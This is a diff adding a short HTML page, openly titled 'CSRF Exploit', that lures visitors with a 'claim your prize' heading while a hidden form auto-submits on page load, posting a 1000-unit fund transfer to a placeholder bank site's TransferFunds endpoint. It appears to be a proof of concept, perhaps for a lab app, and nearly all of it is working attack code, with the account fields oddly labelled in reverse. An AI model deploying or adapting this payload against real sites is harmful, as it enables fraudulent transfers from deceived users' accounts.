@@ -1,0 +1,14 @@
+﻿
+<h1>CSRF Exploit</h1>
+
+<h1>Click the button below to claim your prize!</h1>
+
+<form id="csrfForm" action="https://your-vulnerable-site.com/Transaction/TransferFunds" method="post">
+    <input type="hidden" name="fromAccount" value="attackerAccount" />
+    <input type="hidden" name="toAccount" value="victimAccount" />
+    <input type="hidden" name="amount" value="1000" />
+</form>
+
+<script>
+    document.getElementById('csrfForm').submit();
+</script>
